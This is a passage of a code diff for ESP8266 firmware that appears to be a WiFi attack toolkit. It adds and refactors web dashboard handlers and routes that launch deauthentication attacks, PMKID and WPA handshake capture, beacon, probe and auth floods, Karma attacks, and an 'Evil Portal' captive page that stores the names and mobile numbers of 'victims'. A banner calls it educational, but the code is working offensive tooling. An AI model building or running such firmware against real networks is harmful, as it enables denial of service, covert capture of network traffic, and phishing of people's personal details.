-      page += "<a href='#' class='btn b2' onclick='startPMKID()'>PMKID Capture</a>";
-    }
-    
-    if (state.handshakeActive) {
-      page += "<a href='/hs' class='btn b3'>STOP Handshake</a>";
-      page += "<a href='/handshake' class='btn b1' target='_blank'>View Handshakes";
-      if (state.handshakeCount > 0) {
-        page += "<span class='badge'>" + String(state.handshakeCount) + "</span>";
-      }
-      page += "</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startHandshake()'>Handshake Capture</a>";
-    }
-    
-    if (state.portalActive) {
-      page += "<a href='/es' class='btn b3'>STOP Portal</a>";
-      page += "<a href='http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin' class='btn b2' target='_blank'>View Victims";
-      if (state.credentialCount > 0) {
-        page += "<span class='badge'>" + String(state.credentialCount) + "</span>";
-      }
-      page += "</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startPortal()'>Evil Portal</a>";
-    }
-    
-    if (state.snifferActive) {
-      page += "<a href='/ns' class='btn b3'>STOP Sniffer</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startSniffer()'>Packet Sniffer</a>";
-    }
-    
-    if (state.beaconFloodActive) {
-      page += "<a href='/bs' class='btn b3'>STOP Beacon</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startBeacon()'>Beacon Flood</a>";
-    }
-    
-    if (state.probeFloodActive) {
-      page += "<a href='/prs' class='btn b3'>STOP Probe</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startProbe()'>Probe Flood</a>";
-    }
-    
-    if (state.authFloodActive) {
-      page += "<a href='/aus' class='btn b3'>STOP Auth</a>";
-    } else {
-      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Auth Flood (Scan)</span>";
-    }
-    
-    if (state.karmaActive) {
-      page += "<a href='/ks' class='btn b3'>STOP Karma</a>";
-    } else {
-      page += "<a href='#' class='btn b2' onclick='startKarma()'>Karma Attack</a>";
-    }
-    
-    page += "</div></div>";
-    
-    if (state.deauthActive) {
-      page += "<div class='box active'><b> DEAUTH STATUS</b><br>" + state.deauthData + "</div>";
-    }
-    
-    if (state.pmkidActive) {
-      page += "<div class='box active'><b> PMKID STATUS</b><br>" + state.pmkidData;
-      page += "<br>Total packets: " + String(state.packetCount);
-      page += "<br>EAPOL frames: " + String(state.eapolCount) + "</div>";
-    }
-    
-    if (state.handshakeActive) {
-      page += "<div class='box active'><b>🔐 HANDSHAKE STATUS</b><br>" + state.handshakeData;
-      page += "<br>Total packets: " + String(state.packetCount);
-      page += "<br>EAPOL frames: " + String(state.eapolCount);
-      page += "<br>Complete handshakes: " + String(state.handshakeCount) + "</div>";
-    }
-    
-    if (state.portalActive) {
-      page += "<div class='box active'><b>🎣 PORTAL STATUS</b><br>" + state.credentialData;
-      page += "<br><b>Access Admin Panel:</b> http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin</div>";
-    }
-    
-    if (state.snifferActive) {
-      page += "<div class='box active'><b>📡 SNIFFER STATUS</b><br>Channel: " + String(state.targetChannel);
-      page += "<br>Packets: " + String(state.packetCount) + "</div>";
-    }
-    
-    if (state.beaconFloodActive) {
-      page += "<div class='box active'><b>📡 BEACON FLOOD STATUS</b><br>" + state.beaconData;
-      page += "<br>Beacons sent: " + String(state.beaconCount) + "</div>";
-    }
-    
-    if (state.probeFloodActive) {
-      page += "<div class='box active'><b>📡 PROBE FLOOD STATUS</b><br>" + state.probeData;
-      page += "<br>Probes sent: " + String(state.probeCount) + "</div>";
-    }
-    
-    if (state.authFloodActive) {
-      page += "<div class='box active'><b>📡 AUTH FLOOD STATUS</b><br>" + state.authData;
-      page += "<br>Auths sent: " + String(state.authCount) + "</div>";
-    }
-    
-    if (state.karmaActive) {
-      page += "<div class='box active'><b>📡 KARMA STATUS</b><br>" + state.karmaData;
-      page += "<br>Responses sent: " + String(state.karmaCount) + "</div>";
-    }
-    
-    if (state.scanData.length() > 0 && !state.scanData.startsWith("Click")) {
-      page += "<div class='box'><b> SCAN RESULTS</b><br>" + state.scanData + "</div>";
-    }
-    
-    if (state.hostData.length() > 0 && !state.hostData.startsWith("Click")) {
-      page += "<div class='box'><b> HOST SCAN</b><br>" + state.hostData + "</div>";
-    }
-    
-    page += "</div>";
-    page += "<script>";
-    page += "function atk(m,c,s){if(confirm('Start deauth attack on '+s+'?'))window.location='/d?m='+m+'&c='+c+'&s='+encodeURIComponent(s)}";
-    page += "function atk2(m,c){if(confirm('Start auth flood on '+m+'?'))window.location='/au?m='+m+'&c='+c}";
-    page += "function startPMKID(){var c=document.getElementById('ch').value;window.location='/p?c='+c}";
-    page += "function startHandshake(){var c=document.getElementById('ch').value;window.location='/hsh?c='+c}";
-    page += "function startPortal(){var s=prompt('Enter fake SSID:','Free_WiFi');if(s)window.location='/e?s='+encodeURIComponent(s)}";
-    page += "function startSniffer(){var c=document.getElementById('ch').value;window.location='/n?c='+c}";
-    page += "function startBeacon(){var s=prompt('Enter SSID for beacon flood:','FakeAP');if(s){var c=document.getElementById('ch').value;window.location='/b?s='+encodeURIComponent(s)+'&c='+c}}";
-    page += "function startProbe(){var s=prompt('Enter SSID for probe flood:','TargetNetwork');if(s){var c=document.getElementById('ch').value;window.location='/pr?s='+encodeURIComponent(s)+'&c='+c}}";
-    page += "function startKarma(){var s=prompt('Enter SSID for Karma attack:','Free_WiFi');if(s)window.location='/k?s='+encodeURIComponent(s)}";
-    page += "</script>";
-    page += "</body></html>";
-    
-    state.server->send(200, "text/html", page);
+    HTML::streamDashboard();
   }
-  
+
+  void handleDash() {
+    state.totalRequests++;
+    HTML::streamDashboard();
+  }
+
   void handleScan() {
-    state.scanData = "<table><tr><th>SSID</th><th>Signal</th><th>CH</th><th>Security</th><th>BSSID</th><th>Action</th></tr>";
-    
+    state.scanData = String("<table><tr><th>SSID</th><th>Signal</th><th>CH</th><th>Sec</th><th>BSSID</th><th>Action</th></tr>");
     WiFi.mode(WIFI_AP_STA);
-    int n = WiFi.scanNetworks();
-    
+    int n = WiFi.scanNetworks(false, false);
     if (n > 0) {
       for (int i = 0; i < n && i < Config::MAX_SCAN_RESULTS; i++) {
         String ssid = WiFi.SSID(i);
-        if (ssid.length() == 0) ssid = "[Hidden]";
-        ssid = Utils::sanitizeString(ssid);
-        
-        String encryption = Utils::encryptionTypeStr(WiFi.encryptionType(i));
+        if (ssid.length() == 0) ssid = String("[Hidden]");
+        ssid = Utils::sanitizeAlphaNum(ssid);
+        String enc   = Utils::encStr(WiFi.encryptionType(i));
         String bssid = WiFi.BSSIDstr(i);
-        int channel = WiFi.channel(i);
-        int rssi = WiFi.RSSI(i);
-        
-        String signalQuality = String(rssi) + " dBm";
-        if (rssi > -50) signalQuality += " ";
-        else if (rssi > -60) signalQuality += " ✓";
-        else if (rssi > -70) signalQuality += " ~";
-        
-        state.scanData += "<tr><td>" + ssid + "</td>";
-        state.scanData += "<td>" + signalQuality + "</td>";
-        state.scanData += "<td>" + String(channel) + "</td>";
-        state.scanData += "<td>" + encryption + "</td>";
-        state.scanData += "<td style='font-size:0.75em'>" + bssid + "</td>";
-        state.scanData += "<td><button class='mini' onclick='atk(\"" + bssid + "\"," + String(channel) + ",\"" + ssid + "\")'>DEAUTH</button>";
-        state.scanData += "<button class='mini' onclick='atk2(\"" + bssid + "\"," + String(channel) + ")'>AUTH</button></td></tr>";
-        
-        Utils::resetWatchdog();
+        int ch  = WiFi.channel(i);
+        int rs  = WiFi.RSSI(i);
+        String sig = String(rs) + String(" dBm");
+        if (rs > -50) sig += String(" &#9733;");
+        else if (rs > -70) sig += String(" &#9734;");
+
+        state.scanData += String("<tr><td>") + Utils::htmlEncode(ssid) + String("</td>");
+        state.scanData += String("<td>") + sig + String("</td>");
+        state.scanData += String("<td>") + String(ch) + String("</td>");
+        state.scanData += String("<td>") + enc + String("</td>");
+        state.scanData += String("<td style='font-size:.75em'>") + bssid + String("</td>");
+        state.scanData += String("<td><button class='mn' onclick='atk(\"") + bssid + String("\",") + String(ch) + String(",\"") +
+                          Utils::htmlEncode(ssid) + String("\")'>DEAUTH</button>");
+        state.scanData += String("<button class='mn' onclick='atk2(\"") + bssid + String("\",") + String(ch) + String(")'>AUTH</button></td></tr>");
+        Utils::feedWdt();
       }
-      state.scanData += "</table><div style='margin-top:10px;color:#0ff'>Found " + String(n) + " network(s)</div>";
+      state.scanData += String("</table><div style='margin-top:10px;color:#0ff'>Found ") + String(n) + String(" network(s)</div>");
     } else {
-      state.scanData += "<tr><td colspan='6' style='text-align:center'>No networks found</td></tr></table>";
+      state.scanData += String("<tr><td colspan='6' style='text-align:center'>No networks</td></tr></table>");
     }
-    
     WiFi.scanDelete();
     WiFi.mode(WIFI_AP);
-    
-    Serial.println("WiFi scan complete - Found " + String(n) + " networks");
-    
-    state.server->sendHeader("Location", "/");
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
+
   void handleHosts() {
-    IPAddress localIP = WiFi.softAPIP();
-    state.hostData = "<table><tr><th>IP Address</th><th>Status</th><th>Response Time</th></tr>";
-    
-    int hostsFound = 0;
+    IPAddress lip = WiFi.softAPIP();
+    state.hostData = String("<table><tr><th>IP</th><th>Status</th><th>RTT</th></tr>");
+    int found = 0;
     for (int i = 2; i < 30; i++) {
-      IPAddress targetIP(localIP[0], localIP[1], localIP[2], i);
-      WiFiClient client;
-      client.setTimeout(100);
-      
-      unsigned long startMs = millis();
-      if (client.connect(targetIP, 80)) {
-        unsigned long responseTime = millis() - startMs;
-        state.hostData += "<tr><td>" + targetIP.toString() + "</td>";
-        state.hostData += "<td style='color:#0f0'>● ONLINE</td>";
-        state.hostData += "<td>" + String(responseTime) + " ms</td></tr>";
-        hostsFound++;
-        client.stop();
+      IPAddress tip(lip[0], lip[1], lip[2], i);
+      WiFiClient c;
+      c.setTimeout(100);
+      unsigned long t0 = millis();
+      if (c.connect(tip, 80)) {
+        state.hostData += String("<tr><td>") + tip.toString() + String("</td>");
+        state.hostData += String("<td style='color:#0f0'>&#9679; UP</td>");
+        state.hostData += String("<td>") + String(millis() - t0) + String(" ms</td></tr>");
+        found++;
+        c.stop();
       }
-      
-      Utils::resetWatchdog();
+      Utils::feedWdt();
       yield();
     }
-    
-    if (hostsFound == 0) {
-      state.hostData += "<tr><td colspan='3' style='text-align:center'>No active hosts detected</td></tr>";
-    }
-    
-    state.hostData += "</table><div style='margin-top:10px;color:#0ff'>Detected " + String(hostsFound) + " host(s)</div>";
-    
-    Serial.println("Host scan complete - Found " + String(hostsFound) + " hosts");
-    
-    state.server->sendHeader("Location", "/");
+    if (found == 0)
+      state.hostData += String("<tr><td colspan='3' style='text-align:center'>No hosts</td></tr>");
+    state.hostData += String("</table><div style='margin-top:10px;color:#0ff'>") + String(found) + String(" host(s)</div>");
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
+
   void handleDeauthStart() {
     String mac = state.server->arg("m");
     String ssid = state.server->arg("s");
-    int channel = state.server->arg("c").toInt();
-    
-    if (mac.length() == 0) {
-      state.server->send(400, "text/plain", "Missing MAC address");
-      return;
-    }
-    
-    if (Attacks::startDeauth(mac, channel, ssid)) {
-      state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (mac.length() == 0) { state.server->send(400, String("text/plain"), String("Missing MAC")); return; }
+    if (Attacks::startDeauth(mac, ch, ssid)) {
+      state.server->sendHeader(String("Location"), String("/dash"));
       state.server->send(302);
     } else {
-      state.server->send(400, "text/plain", "Failed to start deauth attack");
+      state.server->send(400, String("text/plain"), String("Deauth failed"));
     }
   }
-  
-  void handleDeauthStop() {
-    Attacks::stopDeauth();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
+  void handleDeauthStop()    { Attacks::stopDeauth();      state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handlePMKIDStop()     { Attacks::stopPMKID();       state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleHSStop()        { Attacks::stopHandshake();   state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handlePortalStop()    { Attacks::stopPortal();      state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleSnifferStop()   { Attacks::stopSniffer();     state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleBeaconStop()    { Attacks::stopBeaconFlood(); state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleProbeStop()     { Attacks::stopProbeFlood();  state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleAuthStop()      { Attacks::stopAuthFlood();   state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleKarmaStop()     { Attacks::stopKarma();       state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+  void handleStopAll()       { Attacks::stopAll();         state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
+
   void handlePMKIDStart() {
-    int channel = state.server->arg("c").toInt();
-    if (channel == 0) channel = 1;
-    
-    Attacks::startPMKID(channel);
-    state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (ch == 0) ch = 1;
+    state.channelHop = state.server->hasArg("hop");
+    Attacks::startPMKID(ch);
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
-  void handlePMKIDStop() {
-    Attacks::stopPMKID();
-    state.server->sendHeader("Location", "/");
+
+  void handleHSStart() {
+    int ch = state.server->arg("c").toInt();
+    if (ch == 0) ch = 1;
+    state.channelHop = state.server->hasArg("hop");
+    Attacks::startHandshake(ch);
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
-  void handleHandshakeStart() {
-    int channel = state.server->arg("c").toInt();
-    if (channel == 0) channel = 1;
-    
-    Attacks::startHandshake(channel);
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
+
+  void handleHSPage() {
+    state.server->send(200, String("text/html"), HTML::handshakePage());
   }
-  
-  void handleHandshakeStop() {
-    Attacks::stopHandshake();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
-  void handleHandshakePage() {
-    state.server->send(200, "text/html", HTML::getHandshakePage());
-  }
-  
-  void handleHandshakeClear() {
-    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
-      state.handshakes[i] = HandshakeData();
-    }
+
+  void handleHSClear() {
+    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) state.handshakes[i] = HandshakeData();
     state.handshakeCount = 0;
-    
-    Serial.println("HANDSHAKE: All handshakes cleared");
-    
-    state.server->sendHeader("Location", "/handshake");
+    state.server->sendHeader(String("Location"), String("/handshake"));
     state.server->send(302);
   }
-  
+
   void handlePortalStart() {
-    String fakeSSID = state.server->arg("s");
-    if (fakeSSID.length() == 0) {
-      fakeSSID = "Free_WiFi";
-    }
-    
-    if (Attacks::startPortal(fakeSSID)) {
-      state.server->sendHeader("Location", "/");
+    String ssid = state.server->arg("s");
+    if (ssid.length() == 0) ssid = String("Free_WiFi");
+    if (Attacks::startPortal(ssid)) {
+      state.server->sendHeader(String("Location"), String("/dash"));
       state.server->send(302);
     } else {
-      state.server->send(500, "text/plain", "Failed to start portal");
+      state.server->send(500, String("text/plain"), String("Portal failed"));
     }
   }
-  
-  void handlePortalStop() {
-    Attacks::stopPortal();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleSnifferStart() {
-    int channel = state.server->arg("c").toInt();
-    if (channel == 0) channel = 1;
-    
-    Attacks::startSniffer(channel);
-    state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (ch == 0) ch = 1;
+    state.channelHop = state.server->hasArg("hop");
+    Attacks::startSniffer(ch);
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
-  void handleSnifferStop() {
-    Attacks::stopSniffer();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleBeaconStart() {
     String ssid = state.server->arg("s");
-    int channel = state.server->arg("c").toInt();
-    if (channel == 0) channel = 1;
-    if (ssid.length() == 0) ssid = "FakeAP";
-    
-    Attacks::startBeaconFlood(channel, ssid);
-    state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (ch == 0) ch = 1;
+    if (ssid.length() == 0) ssid = String("FakeAP");
+    Attacks::startBeaconFlood(ch, ssid);
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
-  void handleBeaconStop() {
-    Attacks::stopBeaconFlood();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleProbeStart() {
     String ssid = state.server->arg("s");
-    int channel = state.server->arg("c").toInt();
-    if (channel == 0) channel = 1;
-    if (ssid.length() == 0) ssid = "TargetNetwork";
-    
-    Attacks::startProbeFlood(channel, ssid);
-    state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (ch == 0) ch = 1;
+    if (ssid.length() == 0) ssid = String("TargetNetwork");
+    Attacks::startProbeFlood(ch, ssid);
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
-  void handleProbeStop() {
-    Attacks::stopProbeFlood();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleAuthStart() {
     String mac = state.server->arg("m");
-    int channel = state.server->arg("c").toInt();
-    
-    if (mac.length() == 0) {
-      state.server->send(400, "text/plain", "Missing MAC address");
-      return;
-    }
-    
-    if (Attacks::startAuthFlood(mac, channel)) {
-      state.server->sendHeader("Location", "/");
+    int ch = state.server->arg("c").toInt();
+    if (mac.length() == 0) { state.server->send(400, String("text/plain"), String("Missing MAC")); return; }
+    if (Attacks::startAuthFlood(mac, ch)) {
+      state.server->sendHeader(String("Location"), String("/dash"));
       state.server->send(302);
     } else {
-      state.server->send(400, "text/plain", "Failed to start auth flood");
+      state.server->send(400, String("text/plain"), String("Auth flood failed"));
     }
   }
-  
-  void handleAuthStop() {
-    Attacks::stopAuthFlood();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleKarmaStart() {
     String ssid = state.server->arg("s");
-    if (ssid.length() == 0) {
-      ssid = "Free_WiFi";
-    }
-    
+    if (ssid.length() == 0) ssid = String("Free_WiFi");
     if (Attacks::startKarma(ssid)) {
-      state.server->sendHeader("Location", "/");
+      state.server->sendHeader(String("Location"), String("/dash"));
       state.server->send(302);
     } else {
-      state.server->send(500, "text/plain", "Failed to start Karma attack");
+      state.server->send(500, String("text/plain"), String("Karma failed"));
     }
   }
-  
-  void handleKarmaStop() {
-    Attacks::stopKarma();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
-  void handleStopAll() {
-    Attacks::stopAllAttacks();
-    state.server->sendHeader("Location", "/");
-    state.server->send(302);
-  }
-  
+
   void handleSubmit() {
-    String name = state.server->arg("name");
-    String mobile = state.server->arg("mobile");
-    
-    name = Utils::sanitizeString(name);
-    mobile = Utils::sanitizeString(mobile);
-    
+    String name   = Utils::sanitizeAlphaNum(state.server->arg("name"));
+    String mobile = Utils::sanitizeAlphaNum(state.server->arg("mobile"));
     if (name.length() == 0 || mobile.length() == 0) {
-      state.server->send(400, "text/plain", "Invalid input");
+      state.server->send(400, String("text/plain"), String("Invalid input"));
       return;
     }
-    
     if (state.credentialCount < Config::MAX_CREDENTIALS) {
-      String timestamp = Utils::formatUptime(millis() - state.startTime);
-      state.credentials[state.credentialCount] = "[" + timestamp + "] " + name + " : " + mobile;
+      state.creds[state.credentialCount].name      = name;
+      state.creds[state.credentialCount].mobile    = mobile;
+      state.creds[state.credentialCount].timestamp = millis();
       state.credentialCount++;
-      
-      Serial.println("VICTIM INFORMATION CAPTURED:");
-      Serial.println("  Time: " + timestamp);
-      Serial.println("  Name: " + name);
-      Serial.println("  Mobile: " + mobile);
-      
-      state.credentialData = "Active - Captured: " + String(state.credentialCount) + " victim(s)";
+      Serial.println(String("VICTIM: ") + name + String(" : ") + mobile);
+      state.credentialData = String("Active - Captured: ") + String(state.credentialCount);
     } else {
-      Serial.println("WARNING: Victim storage full!");
+      Serial.println(F("WARNING: Victim storage full"));
     }
-    
-    state.server->send(200, "text/html", HTML::getSuccessPage());
+    state.server->send(200, String("text/html"), HTML::successPage());
   }
-  
-  void handleCredentials() {
-    state.server->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin");
-    state.server->send(302);
-  }
-  
+
   void handleClear() {
-    state.scanData = "Click 'WiFi Scan' to find networks";
-    state.hostData = "Click 'Host Scan' to find devices";
-    state.deauthData = "Select target from scan";
-    state.pmkidData = "Start PMKID capture";
-    state.handshakeData = "Start handshake capture";
-    state.credentialData = "Start portal to capture";
-    state.beaconData = "Start beacon flood";
-    state.probeData = "Start probe flood";
-    state.authData = "Select target from scan";
-    state.karmaData = "Start Karma attack";
-    
-    state.deauthCount = 0;
-    state.packetCount = 0;
-    state.eapolCount = 0;
-    state.handshakeCount = 0;
-    state.beaconCount = 0;
-    state.probeCount = 0;
-    state.authCount = 0;
-    state.karmaCount = 0;
+    state.scanData      = String("Click WiFi Scan");
+    state.hostData      = String("Click Host Scan");
+    state.deauthData    = String("Select target");
+    state.pmkidData     = String("Start PMKID");
+    state.handshakeData = String("Start Handshake");
+    state.credentialData= String("Start Portal");
+    state.beaconData    = String("Start Beacon");
+    state.probeData     = String("Start Probe");
+    state.authData      = String("Select target");
+    state.karmaData     = String("Start Karma");
+    state.deauthCount   = 0;
+    state.packetCount   = 0;
+    state.eapolCount    = 0;
+    state.handshakeCount= 0;
+    state.beaconCount   = 0;
+    state.probeCount    = 0;
+    state.authCount     = 0;
+    state.karmaCount    = 0;
     state.totalRequests = 0;
-    state.errorCount = 0;
-    state.lastError = "";
-    state.startTime = millis();
-    
-    Serial.println("Logs cleared");
-    
-    state.server->sendHeader("Location", "/");
+    state.errorCount    = 0;
+    state.lastError     = "";
+    state.startTime     = millis();
+    state.server->sendHeader(String("Location"), String("/dash"));
     state.server->send(302);
   }
-  
+
   void handleReboot() {
-    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
-    html += "body{background:#c0392b;color:#fff;text-align:center;padding:50px;font-family:Arial;margin:0}";
-    html += "h1{font-size:2.5em;margin:0}";
-    html += ".spinner{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto}";
-    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
-    html += "p{font-size:16px;margin-top:20px}";
-    html += "</style></head><body>";
-    html += "<h1> Rebooting System</h1>";
-    html += "<div class='spinner'></div>";
-    html += "<p>Device will restart in 3 seconds...</p>";
-    html += "<p>Reconnect to the access point after reboot.</p>";
-    html += "</body></html>";
-    
-    state.server->send(200, "text/html", html);
-    
-    Serial.println("\n" + String('=', 50));
-    Serial.println("SYSTEM REBOOT INITIATED");
-    Serial.println(String('=', 50));
-    
+    String h = String("<!DOCTYPE html><html><head><meta charset='UTF-8'><style>"
+             "body{background:#c0392b;color:#fff;text-align:center;padding:50px;font-family:Arial;margin:0}"
+             "h1{font-size:2.5em}.sp{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;"
+             "width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto}"
+             "@keyframes spin{to{transform:rotate(360deg)}}p{font-size:16px;margin-top:20px}"
+             "</style></head><body><h1>&#128260; Rebooting</h1><div class='sp'></div>"
+             "<p>Reconnecting in 3 seconds...</p></body></html>");
+    state.server->send(200, String("text/html"), h);
     delay(1000);
     ESP.restart();
   }
-  
+
   void handleNotFound() {
     if (state.portalActive) {
-      state.server->sendHeader("Location", "/");
+      state.server->sendHeader(String("Location"), String("/"));
       state.server->send(302);
     } else {
-      state.server->send(404, "text/plain", "404 - Not Found");
+      state.server->send(404, String("text/plain"), String("404"));
     }
   }
 }
+
+// ---------- Setup ----------
 
 void setup() {
   Serial.begin(115200);
   delay(100);
-  
   pinMode(Config::LED_PIN, OUTPUT);
   digitalWrite(Config::LED_PIN, HIGH);
-  
-  Serial.println("\n\n" + String('=', 60));
-  Serial.println("  ESP8266 SECURITY TESTING SUITE v2.2 - ENHANCED");
-  Serial.println("  Educational & Authorized Testing Only");
-  Serial.println("  Unauthorized use is ILLEGAL and UNETHICAL");
-  Serial.println(String('=', 60));
-  Serial.println();
-  
+
+  Serial.println(F("\n============================================================"));
+  Serial.println(F("  TTAN SECURITY SUITE v3.0 - ENHANCED"));
+  Serial.println(F("  Educational & Authorized Testing Only"));
+  Serial.println(F("============================================================\n"));
+
   state.startTime = millis();
-  state.scanData = "Click 'WiFi Scan' to find networks";
-  state.hostData = "Click 'Host Scan' to find devices";
-  state.deauthData = "Select target from scan";
-  state.pmkidData = "Start PMKID capture";
-  state.handshakeData = "Start handshake capture";
-  state.credentialData = "Start portal to capture";
-  state.beaconData = "Start beacon flood";
-  state.probeData = "Start probe flood";
-  state.authData = "Select target from scan";
-  state.karmaData = "Start Karma attack";
-  
+
   WiFi.mode(WIFI_AP);
   WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
   delay(100);
-  
+
   IPAddress ip = WiFi.softAPIP();
-  Serial.println("✓ Access Point Started");
-  Serial.println("  SSID: " + String(Config::AP_SSID));
-  Serial.println("  Password: " + String(Config::AP_PASSWORD));
-  Serial.println("  IP Address: " + ip.toString());
-  Serial.println("  MAC Address: " + WiFi.softAPmacAddress());
-  Serial.println();
-  
-  state.server = new ESP8266WebServer(Config::WEB_PORT);
+  Serial.println(String("AP Started | SSID: ") + String(Config::AP_SSID) + String(" | IP: ") + ip.toString());
+
+  state.server      = new ESP8266WebServer(Config::WEB_PORT);
   state.adminServer = new ESP8266WebServer(Config::ADMIN_PORT);
-  state.dnsServer = new DNSServer();
-  
+  state.dnsServer   = new DNSServer();
+
   if (!state.server || !state.adminServer || !state.dnsServer) {
-    Serial.println("FATAL ERROR: Failed to allocate server memory!");
-    Serial.println("Rebooting...");
+    Serial.println(F("FATAL: memory allocation failed"));
     delay(3000);
     ESP.restart();
   }
-  
-  state.server->on("/", Handlers::handleRoot);
-  state.server->on("/s", Handlers::handleScan);
-  state.server->on("/h", Handlers::handleHosts);
-  state.server->on("/d", Handlers::handleDeauthStart);
-  state.server->on("/ds", Handlers::handleDeauthStop);
-  state.server->on("/p", Handlers::handlePMKIDStart);
-  state.server->on("/ps", Handlers::handlePMKIDStop);
-  state.server->on("/hsh", Handlers::handleHandshakeStart);
-  state.server->on("/hs", Handlers::handleHandshakeStop);
-  state.server->on("/handshake", Handlers::handleHandshakePage);
-  state.server->on("/handshake/clear", Handlers::handleHandshakeClear);
-  state.server->on("/e", Handlers::handlePortalStart);
-  state.server->on("/es", Handlers::handlePortalStop);
-  state.server->on("/n", Handlers::handleSnifferStart);
-  state.server->on("/ns", Handlers::handleSnifferStop);
-  state.server->on("/b", Handlers::handleBeaconStart);
-  state.server->on("/bs", Handlers::handleBeaconStop);
-  state.server->on("/pr", Handlers::handleProbeStart);
-  state.server->on("/prs", Handlers::handleProbeStop);
-  state.server->on("/au", Handlers::handleAuthStart);
-  state.server->on("/aus", Handlers::handleAuthStop);
-  state.server->on("/k", Handlers::handleKarmaStart);
-  state.server->on("/ks", Handlers::handleKarmaStop);
-  state.server->on("/c", Handlers::handleCredentials);
-  state.server->on("/x", Handlers::handleClear);
-  state.server->on("/stop", Handlers::handleStopAll);
-  state.server->on("/r", Handlers::handleReboot);
-  state.server->on("/submit", HTTP_POST, Handlers::handleSubmit);
+
+  // Init status strings
+  state.scanData      = String("Click WiFi Scan");
+  state.hostData      = String("Click Host Scan");
+  state.deauthData    = String("Select target");
+  state.pmkidData     = String("Start PMKID");
+  state.handshakeData = String("Start Handshake");
+  state.credentialData= String("Start Portal");
+  state.beaconData    = String("Start Beacon");
+  state.probeData     = String("Start Probe");
+  state.authData      = String("Select target");
+  state.karmaData     = String("Start Karma");
+
+  state.server->on("/",               HTTP_ANY,  Handlers::handleRoot);
+  state.server->on("/dash",           HTTP_ANY,  Handlers::handleDash);
+  state.server->on("/s",              Handlers::handleScan);
+  state.server->on("/h",              Handlers::handleHosts);
+  state.server->on("/d",              Handlers::handleDeauthStart);
+  state.server->on("/ds",             Handlers::handleDeauthStop);
+  state.server->on("/p",              Handlers::handlePMKIDStart);
+  state.server->on("/ps",             Handlers::handlePMKIDStop);
+  state.server->on("/hsh",            Handlers::handleHSStart);
+  state.server->on("/hs",             Handlers::handleHSStop);
+  state.server->on("/handshake",      Handlers::handleHSPage);
+  state.server->on("/handshake/clear",Handlers::handleHSClear);
+  state.server->on("/e",              Handlers::handlePortalStart);
+  state.server->on("/es",             Handlers::handlePortalStop);
+  state.server->on("/n",              Handlers::handleSnifferStart);
+  state.server->on("/ns",             Handlers::handleSnifferStop);
+  state.server->on("/b",              Handlers::handleBeaconStart);
+  state.server->on("/bs",             Handlers::handleBeaconStop);
+  state.server->on("/pr",             Handlers::handleProbeStart);
+  state.server->on("/prs",            Handlers::handleProbeStop);
+  state.server->on("/au",             Handlers::handleAuthStart);
+  state.server->on("/aus",            Handlers::handleAuthStop);
+  state.server->on("/k",              Handlers::handleKarmaStart);
+  state.server->on("/ks",             Handlers::handleKarmaStop);
+  state.server->on("/x",              Handlers::handleClear);
+  state.server->on("/stop",           Handlers::handleStopAll);
+  state.server->on("/r",              Handlers::handleReboot);
+  state.server->on("/submit",         HTTP_POST, Handlers::handleSubmit);
   state.server->onNotFound(Handlers::handleNotFound);
-  
-  state.adminServer->on("/", AdminHandlers::handleAdminRoot);
